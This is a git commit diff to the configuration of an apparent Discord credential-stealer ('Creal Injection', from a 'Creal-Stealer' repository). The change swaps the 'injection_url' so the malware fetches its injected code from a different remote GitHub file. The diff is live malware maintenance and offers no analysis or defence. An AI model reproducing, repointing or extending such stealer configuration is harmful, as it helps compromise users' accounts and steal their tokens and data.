75ace211514b40a4b0385b45be4b87aea9ff2942
vincyxiroff <88449249+vincyxiroff@users.noreply.github.com>
2023-09-04 22:02:50 +0000

    Update index.js

--- p/index.js
+++ p/index.js
@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Creal Injection', 
   embed_icon: 'https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/vincyxiroff/botvps-discord/main/p/index.js', 
   /**
    
    **/
